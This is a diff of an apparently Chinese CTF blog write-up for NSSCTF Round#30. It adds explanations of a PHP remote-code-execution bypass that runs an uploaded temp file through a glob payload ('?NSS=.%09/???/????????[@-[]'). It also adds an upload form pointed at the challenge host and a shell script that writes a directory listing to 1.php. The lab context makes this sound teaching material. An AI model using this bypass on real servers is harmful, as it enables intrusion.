@@ -57,15 +57,16 @@
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250417213543893.png">
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250417214120184.png">
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250417214049775.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png">
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250417215105500.png">
-<meta property="og:image" content="d:\ctf\dablog\csdblog\source\picture\image-20250417215124531.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250417215124531.png">
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250417215134478.png">
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250422210001275.png">
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250422210050463.png">
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250422210253555.png">
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250422212036734.png">
 <meta property="article:published_time" content="2025-04-06T14:48:00.000Z">
-<meta property="article:modified_time" content="2025-04-25T05:46:59.566Z">
+<meta property="article:modified_time" content="2025-04-25T11:14:25.750Z">
 <meta property="article:author" content="达达">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://csd0617.github.io/picture/image-20250406150804182.png">
@@ -399,6 +400,12 @@
 <li>Linux文件名支持用glob通配符代替</li>
 </ul>
 <p>通过上传一个文件, PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p>
+<p>第二个难题接踵而至，执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p>
+<ul>
+<li><code>*</code>可以代替0个及以上任意字符</li>
+<li><code>?</code>可以代表1个任意字符</li>
+</ul>
+<p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code></p>
 <p>保存一个upload.html文件</p>
 <!DOCTYPE html>
 <html lang="en">
@@ -416,6 +423,7 @@
 </body>
 </html>
 
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://node1.anna.nssctf.cn:28008/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 
 
@@ -425,11 +433,49 @@
 <p><img src="/../picture/image-20250417214049775.png" alt="image-20250417214049775"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?NSS=.%09/???/????????[@-[]</span><br></pre></td></tr></table></figure>
 
+<p><code>.</code></p>
+<ul>
+<li>当前目录。</li>
+</ul>
+<p><code>%09</code></p>
+<ul>
+<li>URL 编码的制表符（Tab）。用于混淆路径或绕过路径解析器&#x2F;WAF。</li>
+</ul>
+<p><code>/</code></p>
+<ul>
+<li>路径分隔符。</li>
+</ul>
+<p><code>???</code></p>
+<ul>
+<li>在 glob 中代表<strong>任意三个字符</strong>。</li>
+</ul>
+<p><code>/</code></p>
+<ul>
+<li>路径分隔符。</li>
+</ul>
+<p><code>????????</code></p>
+<ul>
+<li>任意八个字符。</li>
+</ul>
+<p><code>[@-[]</code></p>
+<ul>
+<li><p><strong>这个是最复杂和最有趣的部分</strong>。这是 glob 模式中一种字符集范围选择：</p>
+<ul>
+<li><code>[@-[]</code> 代表一个字符范围，从 <code>@</code> 到 <code>[</code>，ASCII 值从 64 (<code>@</code>) 到 91 (<code>[</code>)。</li>
+<li>glob 中 <code>[]</code> 表示一个字符集，类似正则表达式中的 <code>[abc]</code>。</li>
+<li><code>[@-[]</code> 表示匹配 <code>@</code> 到 <code>[</code> 范围内的任意单个字符（包括大写字母、<code>\</code>, <code>[</code>, <code>Z</code>, 等）。</li>
+<li><strong>注意</strong>：因为 <code>[</code> 是 glob 的保留字符，所以这个写法其实是边界情况，具体能否解析，取决于解析器。</li>
+</ul>
+<p><img src="/../picture/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png" alt="a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc"></p>
+</li>
+</ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">ls / &gt;1.php</span><br></pre></td></tr></table></figure>
 
+<p>#!&#x2F;bin&#x2F;sh</p>
+<p>这是一个 <strong>shebang（哈希叹号）</strong>，用于指明这个脚本应该由哪个解释器来运行。</p>
 <p>然后再去访问1.php   如果没成功就多发包几次</p>
 <p><img src="/../picture/image-20250417215105500.png" alt="image-20250417215105500"></p>
-<p><img src="D:\ctf\dablog\csdblog\source\picture\image-20250417215124531.png" alt="image-20250417215124531"></p>
+<p><img src="/../picture/image-20250417215124531.png" alt="image-20250417215124531"></p>
 <p><img src="/../picture/image-20250417215134478.png" alt="image-20250417215134478"></p>
 <h1 id="hack-the-world"><a href="#hack-the-world" class="headerlink" title="hack_the_world!"></a><strong>hack_the_world!</strong></h1><p>这里首先是一个sessio伪造</p>
 <p>给了源码附件的</p>
@@ -552,10 +598,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        27.4k
+        27.8k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        01:55
+        01:57
       </div>
     
     
@@ -743,7 +789,7 @@
           description: "",
           stripContent: "NSSCTF Round#30 小桃的PHP挑战 第一关 isset($_GET[&amp;#39;one&amp;#39;]) ✅ 为真 $str = &amp;#39;9&amp;#39; $add = substr(&amp;#39;9&amp;#39;, 0, 1) → &amp;#39;9&amp;#39; $add++ → &amp;#39;10&amp;#39; strlen($add) = 2 &amp;gt; 1 → ✅ 条件成立 执行 $A = 1;，不会执行 echo  ✅ 所以：**传 **?one=1&amp;amp;str=9**，会使$A&amp;#x3D;1 第二关",
           date: "Sun Apr 06 2025 22:48:00 GMT+0800",
-          updated: "Fri Apr 25 2025 13:46:59 GMT+0800",
+          updated: "Fri Apr 25 2025 19:14:25 GMT+0800",
           cover: "/../covers/2.jpg",
         };
       </script>
